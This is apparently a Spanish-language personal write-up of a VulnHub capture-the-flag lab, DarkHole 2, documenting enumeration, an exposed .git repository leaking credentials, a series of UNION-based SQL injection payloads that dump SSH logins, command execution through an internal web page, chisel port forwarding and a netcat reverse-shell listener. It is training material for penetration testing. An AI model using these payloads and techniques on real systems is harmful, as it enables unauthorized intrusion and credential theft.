[[Vulnhub]]

Lunes 3 de julio del 2023 México.
CDMX, Polanco.
Valente Spiegel.
___
### Habilidades. [[Disiplinas.]]

### DarkHole 2

Information Leakage
Github Project Enumeration
SQLI (SQL Injection)
Chisel (Remote Port Forwarding) + Abusing Internal Web Server
Bash History - Information Leakage [User Pivoting]
Abusing Sudoers Privilege [Privilege Escalation]

### Preparación

eWPT 
eJPT
___
## Creación de directorios oh espacio de trabajo.

Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.

```
Mkdir DarkHole2 && cd DarkHole2 && mkdir {Scan,Content,Exploits,Evidencia}
```
___
# Fase de descubrimiento y enumeración.

El objetivo principal de la fase de descubrimiento es obtener una visión general de la red objetivo. Se busca identificar los dispositivos activos, como servidores, routers, y otros equipos de red, así como los servicios y aplicaciones que se ejecutan en ellos. Esto se logra mediante el uso de herramientas de escaneo de red.

```
Sudo netdiscover

El comando "sudo netdiscover" también se utiliza para realizar un escaneo de red en busca de dispositivos activos. Al ejecutarlo con privilegios de superusuario, netdiscover enviará paquetes de sondeo a la red local y mostrará información sobre los hosts activos, como direcciones IP y direcciones MAC.

Ping -c 1 192.168.153.131

El comando "ping -c 1 192.168.153.131" se utiliza para enviar un solo paquete de ping a la dirección IP especificada (en este caso, 192.168.153.28). El ping es una utilidad de red que se utiliza para verificar la conectividad entre dos dispositivos. Al enviar un paquete de ping a una dirección IP, se espera recibir una respuesta si el host está activo y accesible en la red. El parámetro "-c 1" indica que se enviará solo un paquete de ping.
```

![[Captura de pantalla -2023-06-30 16-23-51.png|2000]]

En general, una traza con un TTL (Time To Live) de 64 no proporciona información directa sobre el sistema operativo de la máquina destino. El TTL se utiliza para limitar la vida útil de un paquete de red en la red y evitar que circule infinitamente. Cada salto en la ruta del paquete decrementa el valor del TTL en 1. Si el TTL llega a cero, el paquete se descarta y se envía una notificación de "Time Exceeded" (Tiempo Excedido) al remitente.
Sin embargo, a menudo se asocia un valor de TTL de 64 con sistemas operativos basados en Linux debido a la configuración predeterminada de la pila de red de Linux. Los sistemas operativos Linux suelen establecer el valor inicial del TTL en 64 para los paquetes salientes. Sin embargo, esto no es exclusivo de los sistemas Linux, ya que otros sistemas operativos también pueden utilizar valores de TTL similares.

==Escaneo de puertos:

Se realiza un escaneo más detallado de los puertos abiertos identificados durante la fase de descubrimiento. Esto implica el uso de herramientas como Nmap para obtener información sobre los servicios y versiones específicas que se ejecutan en cada puerto.

```
Sudo nmap -p- --open -sS --min-rate 5000 -vvv - n - Pn 192.168.153.131

El comando "sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.131" es una forma de utilizar la herramienta de escaneo de red Nmap con una serie de opciones y argumentos específicos. Aquí está el significado de cada opción utilizada en el comando:

- `sudo`: Ejecuta el comando con privilegios de superusuario para obtener un escaneo más completo y preciso.

- `nmap`: El comando en sí para ejecutar Nmap.

- `-p-`: Escanea todos los puertos, desde el puerto 1 hasta el puerto 65535. Esto permite una exploración exhaustiva de todos los puertos abiertos en el objetivo.

- `--open`: Muestra solo los puertos que están abiertos y disponibles para conexiones.

- `-sS`: Realiza un escaneo TCP SYN. Envia un paquete SYN al puerto de destino y espera una respuesta SYN-ACK. Este tipo de escaneo se utiliza para determinar qué puertos están abiertos.

- `--min-rate 5000`: Establece la tasa mínima de paquetes enviados por segundo a 5000. Esto controla la velocidad del escaneo, asegurando que se envíen suficientes paquetes para obtener resultados precisos.

- `-vvv`: Establece el nivel de verbosidad a "muy, muy, muy" alto, lo que proporciona una salida detallada y exhaustiva durante el escaneo.

- `-n`: Desactiva la resolución de nombres de hosts para acelerar el escaneo y evitar consultas DNS.

- `-Pn`: Suprime la detección de hosts y trata todas las direcciones IP especificadas como hosts activos. Esto puede ser útil si se desea escanear un objetivo incluso si no hay respuesta a los pings.

- `192.168.153.131`: Es la dirección IP del objetivo que se va a escanear
```

![[Captura de pantalla -2023-06-30 16-29-02.png|1000]]

![[Captura de pantalla 2023-06-22 123721.png|2000]]

==Enumeración de servicios:

Una vez identificados los puertos abiertos, se realiza una enumeración exhaustiva de los servicios encontrados. Esto incluye la obtención de información detallada sobre las aplicaciones, protocolos, configuraciones y cualquier dato relevante que pueda ayudar a identificar debilidades o vulnerabilidades.

```
Sudo nmap -sCV -p22,80 192.169.153.131 -oN targeted

- `sudo`: Ejecuta el comando con privilegios de superusuario para obtener un escaneo más completo y preciso.

- `nmap`: El comando en sí para ejecutar Nmap.

- `-sCV`: Realiza un escaneo combinado, utilizando los scripts de detección de versiones y los scripts de enumeración de servicios predeterminados de Nmap. Esta opción ayuda a identificar los servicios y sus versiones en los puertos abiertos.

- `-p22,80`: Especifica los puertos a escanear. En este caso, el escaneo se realiza en los puertos 22 (SSH) y 80 (HTTP).

- `192.169.153.131`: Es la dirección IP del objetivo que se va a escanear.

- `-oN targeted`: Guarda la salida del escaneo en un archivo llamado "targeted". La opción `-oN` se utiliza para especificar el formato de salida como normal (texto plano).
```

```
22/tcp open ssh OpenSSH 7.9

El puerto 22/tcp es el puerto predeterminado utilizado por el protocolo SSH (Secure Shell) para la comunicación segura entre un cliente y un servidor. SSH es un protocolo de red utilizado para el acceso remoto a sistemas y dispositivos, así como para el transporte seguro de datos.

Cuando el puerto 22/tcp está abierto y se detecta que SSH está en ejecución en ese puerto, significa que el servidor está escuchando conexiones entrantes y acepta conexiones SSH. Esto puede tener implicaciones importantes en términos de ciberseguridad. A continuación, se mencionan algunos aspectos relevantes a considerar:

1. Acceso remoto seguro: La apertura del puerto 22/tcp indica que se permite el acceso remoto al sistema o dispositivo a través del protocolo SSH. Esto puede ser beneficioso para administrar servidores de forma remota de manera segura, ya que SSH utiliza técnicas criptográficas para proteger la comunicación.

2. Autenticación segura: SSH ofrece opciones de autenticación segura, como el uso de claves públicas y privadas, lo que proporciona una mayor seguridad en comparación con otros protocolos de acceso remoto más antiguos, como Telnet.
   
3. Posible objetivo para ataques: El puerto 22/tcp abierto también puede ser un objetivo para los atacantes, ya que los servidores SSH pueden ser vulnerables a intentos de fuerza bruta, intentos de autenticación y ataques de diccionario. Es importante mantener actualizados los sistemas SSH, aplicar políticas de contraseñas fuertes y utilizar medidas de seguridad adicionales, como bloqueo de direcciones IP o autenticación multifactor, para proteger contra posibles ataques.
   
4. Auditoría y registro: Al tener el puerto 22/tcp abierto y el servicio SSH en ejecución, es importante llevar a cabo una auditoría y registro adecuados de las actividades de acceso y las conexiones SSH realizadas. Esto permite el monitoreo y la detección de comportamientos anómalos o intentos de acceso no autorizados.
```

```
80/tcp open http Apachehttpd 3.4.38

El puerto 80/tcp es el puerto predeterminado utilizado por el protocolo HTTP (Hypertext Transfer Protocol) para la comunicación entre clientes y servidores web. Cuando el puerto 80/tcp está abierto y se detecta el servicio HTTP en ejecución, indica que el servidor está escuchando conexiones entrantes y puede servir páginas web a través de este protocolo.

1. Servicio web: La apertura del puerto 80/tcp y el funcionamiento de Apache HTTP (versión 2.4.3) indican que el servidor está configurado para servir páginas web a través del protocolo HTTP. Esto puede ser un objetivo potencial para los atacantes, ya que los servidores web son puntos de entrada comunes para ataques y explotaciones.

2. Configuración segura: Es fundamental configurar el servidor web de manera segura. Esto implica aplicar directivas y configuraciones adecuadas para evitar ataques como inyecciones de código, desbordamientos de búfer, ataques de fuerza bruta y otros vectores de ataque comunes dirigidos a servidores web.

3. Seguridad del contenido: Además de la seguridad del servidor web en sí, también es importante considerar la seguridad del contenido que se sirve a través del puerto 80/tcp. Esto incluye el manejo adecuado de datos sensibles, la protección contra ataques de inyección SQL, la mitigación de ataques de denegación de servicio y la implementación de mecanismos de autenticación y autorización sólidos.
```
___
# Escaneo Web.

==Como sabemos que la maquina esta desplegando un servicio http desde el puerto 80, esta es nuestra principal puerta de entrada.

![[Captura de pantalla -2023-06-30 16-29-21.png]]

![[Captura de pantalla -2023-06-30 16-41-23.png]]
```
Sudo nmap --script http-enum -p80 192.168.153.131 -oN webScan

Este comando utiliza Nmap con el script "http-enum" para realizar un escaneo específico en el puerto 80 de la dirección IP de destino. El script "http-enum" se encarga de enumerar y obtener información adicional sobre los servicios HTTP

- `sudo`: Ejecuta el comando con privilegios de superusuario para obtener un escaneo más completo y preciso.

- `nmap`: El comando en sí para ejecutar Nmap.

- `--script http-enum`: Especifica el script de Nmap que se utilizará, en este caso, "http-enum". Este script se utiliza para enumerar y obtener información adicional sobre los servicios HTTP en el objetivo.

- `-p80`: Especifica el puerto a escanear. En este caso, el escaneo se realiza en el puerto 80, que es el puerto predeterminado utilizado por el protocolo HTTP.

- `192.168.153.131`: Es la dirección IP del objetivo que se va a escanear.

- `-oN webScan`: Guarda la salida del escaneo en un archivo llamado "webScan". La opción `-oN` se utiliza para especificar el formato de salida como normal (texto plano).
```

==En el descibrimiento encontramos el proyecto /.git/  

![[Captura de pantalla -2023-07-03 14-55-39.png]]

```
http://192.168.153.131/.git/ 
```

![[Captura de pantalla -2023-06-30 16-29-37.png]]

No es comin que nos encontremos el directorio del proyecto .git., nos vamos a aprobecar de esto descargando el proyecto y vuzualizando los cambios oh configuraciones del git en busca de informacion que nos ayude a comprometer la maquina.

```
wget -r http://192.168.153.131/.git
ls
```

![[Captura de pantalla -2023-07-03 14-56-57.png]]

==Se encuentra un login.php el cual debe tener cambios en "commits".

![[Captura de pantalla -2023-07-03 17-28-45.png]]

![[Captura de pantalla -2023-07-03 17-32-54.png]]

![[Captura de pantalla -2023-07-03 17-33-48.png]]

![[Captura de pantalla -2023-07-03 17-34-40.png]]
==Filtrando nos encontramos con credenciales., presumiblemente reutilizada. 

![[Captura de pantalla -2023-07-03 17-35-20.png]]

==Las credenciales encontradas presumiblemente son para el directorio login de la paqgina web

```
lush@admin.com
321
```
---
## ==Escalamiento a usuario.

![[Captura de pantalla -2023-06-30 16-41-23.png]]

==Las contraseñas son correctas y nos permite entrar visualizar el dashboard., la url nos presenta un indicio de injencctionSQL por terminar en .php?id=1

![[Captura de pantalla -2023-07-03 17-37-21.png]]

==vamos a interceptar la petición web al actualizar con BurpSuite y FoxyProxy.

---
# SQL Injecction.

![](Captura%20de%20pantalla%20-2023-07-04%2013-53-09.png)

==En la petición GET podemos añadir la injecction "Sin olvidar URLencodear" para no tener problemas conla peticion seleccionando el texto y utilizando las teclas Ctrl+shift+U
Se busca que el estado de la petición sea un 200 OK

```
' order by 6-- -
```

![](Captura%20de%20pantalla%20-2023-07-04%2013-56-23.png)

```
' union select 1,2,3,4,5,6-- -
```

![](Captura%20de%20pantalla%20-2023-07-04%2014-02-14.png)
![](Captura%20de%20pantalla%20-2023-07-04%2014-02-19.png)


```
' union select 1,2,database(),4,5,6-- -
```

![](Captura%20de%20pantalla%20-2023-07-04%2014-06-25.png)

```
' union select 1,2,schema_name,4,5,6 from information_schema.schemata-- -
```

![](Captura%20de%20pantalla%20-2023-07-04%2014-08-34.png)

```
' union select 1,2,group_concat(schema_name),4,5,6 from information_schema.schemata-- -
```
![](Captura%20de%20pantalla%20-2023-07-04%2014-10-34.png)
![](Captura%20de%20pantalla%20-2023-07-04%2014-11-57.png)
```
' union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema%3d'darkhole_2'-- -
```
![](Captura%20de%20pantalla%20-2023-07-04%2014-20-25.png)
```
' union select 1,2,group_concat(colum_name),4,5,6 from information_schema.columns where table_schema%3d'darkhole_2' and table_name%3d'ssh'-- -
```
![](Captura%20de%20pantalla%20-2023-07-04%2014-23-50.png)
```
' union select 1,2,group_concat(user,0x3a,pass),4,5,6 from ssh-- -
```
![](Captura%20de%20pantalla%20-2023-07-04%2014-26-29.png)
![](Captura%20de%20pantalla%20-2023-07-04%2014-28-01.png)

```
ssh jehad@192.168.153.131
yes
fool

```

---

# Reverse Shell and PortForgeting


![](Captura%20de%20pantalla%20-2023-07-04%2014-29-14.png)

```
pwd
netstat -nat
```

![](Captura%20de%20pantalla%20-2023-07-04%2014-31-38.png)
```
ps -faux ! grep 9999
```
![](Captura%20de%20pantalla%20-2023-07-04%2014-32-25.png)
```
cd /opl/web
ls
cat index.php
```

![](Captura%20de%20pantalla%20-2023-07-04%2014-38-03.png)
```
curl "http://localhost:9999/index.php"?cmd=whoami" -X GET; echo
```
![](Captura%20de%20pantalla%20-2023-07-04%2014-37-11.png)

```
curl "http://localhost:9999/index.php"?cmd=id" -X GET; echo
```

![](Captura%20de%20pantalla%20-2023-07-04%2014-38-33.png)

![](Captura%20de%20pantalla%20-2023-07-05%2014-08-40.png)

```
mv chisel_1.8.1_linux_amd64 chisel
gunzip chisel
chmod +x chisel
file chisel
```

![](Captura%20de%20pantalla%20-2023-07-05%2014-12-23.png)
```
sudo python3 -m http.server 80
cd /tmp/
wget http://192.168.153.131/chisel
```
![](Captura%20de%20pantalla%20-2023-07-05%2014-15-56.png)

```
chmod +x chisel
./chisel client 192.168.153.129 -p 1234

```
```
./chisel server --reverse -p 1234
lsof -i:9999
```

![](Captura%20de%20pantalla%20-2023-07-05%2014-21-58.png)
```

```
![](Captura%20de%20pantalla%20-2023-07-05%2014-42-58.png)

```
sudo nc -nlvp 443
```

![](Captura%20de%20pantalla%20-2023-07-05%2014-42-51.png)
```
script /dev/null -c bash
Ctrl+c
```
![](Captura%20de%20pantalla%20-2023-07-05%2014-45-50.png)
```

```
![](Captura%20de%20pantalla%20-2023-07-05%2014-48-27.png)

![](Captura%20de%20pantalla%20-2023-07-05%2014-49-28.png)

---
## Escalamiento a Root

![](Captura%20de%20pantalla%20-2023-07-05%2014-54-06.png)

![](Captura%20de%20pantalla%20-2023-07-05%2014-54-24.png)

![](Captura%20de%20pantalla%20-2023-07-05%2014-56-38.png)

![](Captura%20de%20pantalla%20-2023-07-05%2014-58-04.png)

![](Captura%20de%20pantalla%20-2023-07-05%2014-59-16.png)
